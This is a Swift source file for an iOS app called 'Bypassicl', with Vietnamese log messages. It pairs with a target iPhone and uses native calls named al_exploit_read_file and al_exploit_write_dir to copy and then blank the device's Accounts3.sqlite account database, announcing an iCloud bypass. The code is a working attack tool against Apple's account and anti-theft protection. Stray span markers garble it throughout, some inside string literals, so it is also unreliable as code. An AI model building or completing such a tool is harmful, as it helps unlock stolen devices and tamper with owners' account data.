import Foundation
import Combine
import UniformTypeIdentifiers
import Network

class AirliftService: ObservableObject {
    static let shared = AirliftService()
    
    @Published var logs: String = "=== Bypassicl Log ===\n[span_1](start_span)"[span_1](end_span)
    @Published var isPairing = false[span_2](start_span)[span_2](end_span)
    @Published var currentPin: String? = nil[span_3](start_span)[span_3](end_span)
    @Published var pairingFilePath: String? = nil[span_4](start_span)[span_4](end_span)
    @Published var lastDeviceName: String? = nil[span_5](start_span)[span_5](end_span)
    
    private var localNetProbeListener: NWListener?
    private let accountsDir = "/var/mobile/Library/Accounts[span_6](start_span)"[span_6](end_span)
    private let targetFiles = ["Accounts3.sqlite", "Accounts3.sqlite-shm", "Accounts3.sqlite-wal"][span_7](start_span)[span_7](end_span)
    
    var backupDir: URL {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
            .appendingPathComponent("AccountsBackup")[span_8](start_span)[span_8](end_span)
    }
    
    private var documentsDir: URL {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0][span_9](start_span)[span_9](end_span)
    }
    
    private func log(_ message: String) {
        DispatchQueue.main.async {
            self.logs += message + "\n[span_10](start_span)"[span_10](end_span)
            print(message)[span_11](start_span)[span_11](end_span)
        }
    }
    
    // MARK: - Callbacks
    private static let logCallback: ALLogCallback = { ctx, msg in
        guard let msg = msg, let ctx = ctx else { return }[span_12](start_span)[span_12](end_span)
        let service = Unmanaged<AirliftService>.fromOpaque(ctx).takeUnretainedValue()[span_13](start_span)[span_13](end_span)
        service.log("[Airlift] \(String(cString: msg))")[span_14](start_span)[span_14](end_span)
    }
    
    private static let pinCallback: ALPairPinCb = { pin, ctx in
        guard let pin = pin, let ctx = ctx else { return }[span_15](start_span)[span_15](end_span)
        let service = Unmanaged<AirliftService>.fromOpaque(ctx).takeUnretainedValue()[span_16](start_span)[span_16](end_span)
        let pinStr = String(cString: pin)[span_17](start_span)[span_17](end_span)
        DispatchQueue.main.async {
            service.currentPin = pinStr[span_18](start_span)[span_18](end_span)
            service.log("🔐 PIN: \(pinStr)  →  Vào Settings → Developer → nhập PIN này")[span_19](start_span)[span_19](end_span)
        }
    }
    
    private static let readyCallback: ALPairReadyCb = { ctx, serviceId, port, _, _, _ in
        guard let ctx = ctx else { return }[span_20](start_span)[span_20](end_span)
        let service = Unmanaged<AirliftService>.fromOpaque(ctx).takeUnretainedValue()[span_21](start_span)[span_21](end_span)
        let sid = serviceId != nil ? String(cString: serviceId!) : "?[span_22](start_span)"[span_22](end_span)
        service.log("📡 Bonjour ready: \(sid) : \(port)")[span_23](start_span)[span_23](end_span)
    }
    
    // MARK: - Import Pairing File
    func importPairingFile(from url: URL) {
        do {
            // Bắt đầu access security-scoped resource
            let accessing = url.startAccessingSecurityScopedResource()[span_24](start_span)[span_24](end_span)
            defer { if accessing { url.stopAccessingSecurityScopedResource() } }[span_25](start_span)[span_25](end_span)
            
            let data = try Data(contentsOf: url)[span_26](start_span)[span_26](end_span)
            let dest = documentsDir.appendingPathComponent("pairingRecord.mobiledevicepairing")[span_27](start_span)[span_27](end_span)
            try data.write(to: dest)[span_28](start_span)[span_28](end_span)
            
            DispatchQueue.main.async {
                self.pairingFilePath = dest.path[span_29](start_span)[span_29](end_span)
                self.log("✅ Đã import pairing file (\(data.count) bytes)")[span_30](start_span)[span_30](end_span)
            }
        } catch {
            log("❌ Import pairing thất bại: \(error.localizedDescription)")[span_31](start_span)[span_31](end_span)
        }
    }
    
    // MARK: - Pair on Device (iOS 27) - Bonjour + Unlimited
    func startPairingOnDevice() {
        guard !isPairing else { return }[span_32](start_span)[span_32](end_span)
        
        isPairing = true[span_33](start_span)[span_33](end_span)
        currentPin = nil[span_34](start_span)[span_34](end_span)
        log("[*] Bắt đầu Pair on Device (Bonjour)...")[span_35](start_span)[span_35](end_span)
        log("👉 Mở Settings → Developer Mode trên iPhone target và chờ PIN")[span_36](start_span)[span_36](end_span)
        
        let outPath = documentsDir.appendingPathComponent("pairingRecord.mobiledevicepairing").path[span_37](start_span)[span_37](end_span)
        let ctx = Unmanaged.passUnretained(self).toOpaque()[span_38](start_span)[span_38](end_span)
        
        DispatchQueue.main.async {
            self.triggerLocalNetworkPermission()
        }
        
        DispatchQueue.global(qos: .userInitiated).async {
            var result = ALPairResult()[span_39](start_span)[span_39](end_span)
            
            // port = 0 → OS tự chọn
            // bind_addr = "0.0.0.0" → listen all interfaces
            // name/model có thể tùy chỉnh
            let code = al_pairing_run_host(
                "0.0.0.0",
                0,
                "Bypassicl",
                "iPhone",
                outPath,
                nil,                    // host_alt_irk_hex (lần đầu = nil)
                AirliftService.readyCallback,
                AirliftService.pinCallback,
                ctx,
                &result
            )[span_40](start_span)[span_40](end_span)
            
            defer { al_pairing_result_free(&result) }[span_41](start_span)[span_41](end_span)
            
            DispatchQueue.main.async {
                self.localNetProbeListener?.cancel()
                self.localNetProbeListener = nil
                self.isPairing = false[span_42](start_span)[span_42](end_span)
                self.currentPin = nil[span_43](start_span)[span_43](end_span)
                
                if code == 0 {
                    if let path = result.pairing_file_path {
                        self.pairingFilePath = String(cString: path)[span_44](start_span)[span_44](end_span)
                        self.log("✅ Pairing thành công!")[span_45](start_span)[span_45](end_span)
                        self.log("📁 File: \(self.pairingFilePath!)")[span_46](start_span)[span_46](end_span)
                    }
                    if let name = result.device_name {
                        self.lastDeviceName = String(cString: name)[span_47](start_span)[span_47](end_span)
                        self.log("📱 Device: \(self.lastDeviceName!)")[span_48](start_span)[span_48](end_span)
                    }
                } else {
                    let err = result.error != nil ? String(cString: result.error!) : "unknown[span_49](start_span)"[span_49](end_span)
                    self.log("❌ Pairing thất bại: \(err)")[span_50](start_span)[span_50](end_span)
                }
            }
        }
    }
    
    private func triggerLocalNetworkPermission() {
        localNetProbeListener?.cancel()
        localNetProbeListener = nil
        
        do {
            let params = NWParameters.tcp
            params.includePeerToPeer = true
            let probe = try NWListener(using: params, on: .any)
            probe.service = NWListener.Service(
                name: "BypassiclProbe-\(UUID().uuidString.prefix(4))",
                type: "_remotepairing-pairable-host._tcp",
                domain: "local."
            )
            probe.stateUpdateHandler = { [weak self] state in
                switch state {
                case .ready:
                    self?.log("🌐 Local Network sẵn sàng")
                case .failed(let error):
                    self?.log("⚠️ Local Network probe: \(error.localizedDescription)")
                default:
                    break
                }
            }
            localNetProbeListener = probe
            probe.start(queue: .main)
        } catch {
            log("⚠️ Không thể khởi tạo probe mạng cục bộ: \(error.localizedDescription)")
        }
    }
    
    func stopPairing() {
        // al_pairing_run_host là blocking, hiện không có API stop.
        // Chỉ reset UI state.
        localNetProbeListener?.cancel()
        localNetProbeListener = nil
        isPairing = false[span_51](start_span)[span_51](end_span)
        currentPin = nil[span_52](start_span)[span_52](end_span)
        log("⏹ Đã hủy trạng thái pairing (host vẫn có thể đang chạy)")[span_53](start_span)[span_53](end_span)
    }
    
    // MARK: - Connect (dùng pairing đã có)
    func connect() -> Bool {
        log("[*] Kiểm tra pairing...")[span_54](start_span)[span_54](end_span)
        
        if pairingFilePath == nil {
            // Tự tìm trong Documents
            let candidates = [
                "pairingRecord.mobiledevicepairing",
                "pairingRecord.plist",
                "pairing.plist"
            ][span_55](start_span)[span_55](end_span)
            for name in candidates {
                let url = documentsDir.appendingPathComponent(name)[span_56](start_span)[span_56](end_span)
                if FileManager.default.fileExists(atPath: url.path) {
                    pairingFilePath = url.path[span_57](start_span)[span_57](end_span)
                    break[span_58](start_span)[span_58](end_span)
                }
            }
        }
        
        guard let path = pairingFilePath, FileManager.default.fileExists(atPath: path) else {
            log("❌ Chưa có pairing file. Hãy Pair on Device hoặc Import file.")[span_59](start_span)[span_59](end_span)
            return false[span_60](start_span)[span_60](end_span)
        }
        
        log("✅ Dùng pairing: \(path)")[span_61](start_span)[span_61](end_span)
        return true[span_62](start_span)[span_62](end_span)
    }
    
    // MARK: - Grappa (giữ nguyên)
    private func generateGrappaToken() -> Data? {
        let maxLen = 1024[span_63](start_span)[span_63](end_span)
        var buffer = [UInt8](repeating: 0, count: maxLen)[span_64](start_span)[span_64](end_span)
        var outLen: size_t = 0[span_65](start_span)[span_65](end_span)
        var errBuffer = [CChar](repeating: 0, count: 256)[span_66](start_span)[span_66](end_span)
        
        let result = ALGetGrappaToken(1, 0, 1, &buffer, maxLen, &outLen, &errBuffer, 256)[span_67](start_span)[span_67](end_span)
        if result == 0 {
            return Data(bytes: buffer, count: Int(outLen))[span_68](start_span)[span_68](end_span)
        } else {
            log("Grappa Error (\(result)): \(String(cString: errBuffer))")[span_69](start_span)[span_69](end_span)
            return nil[span_70](start_span)[span_70](end_span)
        }
    }
    
    // MARK: - FFI helpers
    private func ffi_read_file(_ iosPath: String) -> Data? {
        guard let pairing = pairingFilePath else { return nil }[span_71](start_span)[span_71](end_span)
        
        var outData: UnsafeMutablePointer<UInt8>? = nil[span_72](start_span)[span_72](end_span)
        var outLen: size_t = 0[span_73](start_span)[span_73](end_span)
        var outError: UnsafeMutablePointer<CChar>? = nil[span_74](start_span)[span_74](end_span)
        let ctx = Unmanaged.passUnretained(self).toOpaque()[span_75](start_span)[span_75](end_span)
        
        let result = al_exploit_read_file(pairing, iosPath, AirliftService.logCallback, ctx, &outData, &outLen, &outError)[span_76](start_span)[span_76](end_span)
        
        defer {
            if let e = outError { al_string_free(e) }[span_77](start_span)[span_77](end_span)
            if let d = outData { al_bytes_free(d, outLen) }[span_78](start_span)[span_78](end_span)
        }
        
        guard result == 0, let ptr = outData, outLen > 0 else {
            let err = outError != nil ? String(cString: outError!) : "unknown[span_79](start_span)"[span_79](end_span)
            log("❌ Đọc \(iosPath) thất bại: \(err)")[span_80](start_span)[span_80](end_span)
            return nil[span_81](start_span)[span_81](end_span)
        }
        return Data(bytes: ptr, count: Int(outLen))[span_82](start_span)[span_82](end_span)
    }
    
    private func ffi_write_dir(sourceDir: String, targetDir: String) -> Bool {
        guard let pairing = pairingFilePath else { return false }[span_83](start_span)[span_83](end_span)
        
        var outError: UnsafeMutablePointer<CChar>? = nil[span_84](start_span)[span_84](end_span)
        let ctx = Unmanaged.passUnretained(self).toOpaque()[span_85](start_span)[span_85](end_span)
        
        let result = al_exploit_write_dir(pairing, sourceDir, targetDir, AirliftService.logCallback, ctx, &outError)[span_86](start_span)[span_86](end_span)
        
        defer { if let e = outError { al_string_free(e) } }[span_87](start_span)[span_87](end_span)
        
        if result != 0 {
            let err = outError != nil ? String(cString: outError!) : "unknown[span_88](start_span)"[span_88](end_span)
            log("❌ Ghi đè thất bại: \(err)")[span_89](start_span)[span_89](end_span)
            return false[span_90](start_span)[span_90](end_span)
        }
        return true[span_91](start_span)[span_91](end_span)
    }
    
    // MARK: - Backup & Bypass
    func backupAccounts() -> Bool {
        log("[*] Backup Accounts...")[span_92](start_span)[span_92](end_span)
        try? FileManager.default.createDirectory(at: backupDir, withIntermediateDirectories: true)[span_93](start_span)[span_93](end_span)
        
        var ok = true[span_94](start_span)[span_94](end_span)
        for file in targetFiles {
            let path = "\(accountsDir)/\(file)[span_95](start_span)"[span_95](end_span)
            guard let data = ffi_read_file(path) else {
                ok = false[span_96](start_span)[span_96](end_span)
                continue[span_97](start_span)[span_97](end_span)
            }
            do {
                try data.write(to: backupDir.appendingPathComponent(file))[span_98](start_span)[span_98](end_span)
                log("✅ Backup \(file) (\(data.count) bytes)")[span_99](start_span)[span_99](end_span)
            } catch {
                log("❌ \(error.localizedDescription)")[span_100](start_span)[span_100](end_span)
                ok = false[span_101](start_span)[span_101](end_span)
            }
        }
        return ok[span_102](start_span)[span_102](end_span)
    }
    
    func bypassICloud() {
        log("[*] Bypass (ghi đè rỗng)...")[span_103](start_span)[span_103](end_span)
        guard backupAccounts() else {
            log("❌ Hủy vì backup thất bại")[span_104](start_span)[span_104](end_span)
            return[span_105](start_span)[span_105](end_span)
        }
        
        let tmp = FileManager.default.temporaryDirectory.appendingPathComponent("empty_\(UUID().uuidString)")[span_106](start_span)[span_106](end_span)
        try? FileManager.default.createDirectory(at: tmp, withIntermediateDirectories: true)[span_107](start_span)[span_107](end_span)
        
        for file in targetFiles {
            try? Data().write(to: tmp.appendingPathComponent(file))[span_108](start_span)[span_108](end_span)
        }
        
        if ffi_write_dir(sourceDir: tmp.path, targetDir: accountsDir) {
            log("🎉 BYPASS THÀNH CÔNG! Reboot thiết bị.")[span_109](start_span)[span_109](end_span)
        } else {
            log("❌ Ghi đè thất bại")[span_110](start_span)[span_110](end_span)
        }
        try? FileManager.default.removeItem(at: tmp)[span_111](start_span)[span_111](end_span)
    }
}
